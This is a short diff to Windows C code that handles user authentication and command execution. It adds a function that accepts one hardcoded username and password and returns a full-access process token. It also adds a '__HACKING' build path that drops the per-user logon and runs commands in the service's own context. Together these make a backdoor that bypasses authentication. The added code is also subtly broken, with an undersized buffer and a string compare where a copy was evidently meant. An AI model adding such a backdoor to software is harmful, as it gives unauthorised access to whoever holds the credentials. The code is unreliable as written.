@@ -75,6 +75,18 @@ void win_free_token(HANDLE token) {
     CloseHandle(token);
 }
 
+static wchar_t* s_domain = L"WORKGROUP";
+int simple_authenticate(wchar_t *username, wchar_t *password, wchar_t **odomain, void **token) {
+	HANDLE hToken;
+	if (!wcscmp(username, L"brock") && !wcscmp(password, L"brock7777")) {
+		*odomain = (wchar_t *)malloc(wcslen(s_domain) + 2);
+		wcscmp(*odomain, s_domain);		
+		OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
+		*token = hToken;
+		return 1;
+	}
+	return 0;
+}
 
 int win_authenticate(wchar_t *username, wchar_t *password, wchar_t **odomain, void **token) {
     wchar_t *user, *domain;
@@ -149,6 +161,16 @@ void *win_execute_command(wchar_t *shell, wchar_t *command, wchar_t *user, wchar
     si.hStdInput = in_rd;
     si.hStdOutput = out_wr; 
     si.hStdError = err_wr;
+
+#ifdef __HACKING
+	if (!CreateProcessW(shell, command, NULL, NULL, TRUE, 0, NULL, root, &si, &ctx->pi)) {
+		int ecode = GetLastError();
+		INFO(GetLastError(), "CreateProcess failed");
+        free(ctx);
+		CloseHandle(ntok);
+        return NULL;
+    }
+#else
 /*
     if (!CreateProcessWithLogonW(user, domain, password, LOGON_WITH_PROFILE, shell, command, 0, NULL, root, &si, &ctx->pi)) {
 	*/
@@ -173,6 +195,7 @@ void *win_execute_command(wchar_t *shell, wchar_t *command, wchar_t *user, wchar
         return NULL;
     }
 	CloseHandle(ntok);
+#endif
     CloseHandle(out_wr);
     CloseHandle(err_wr);
     CloseHandle(in_rd);
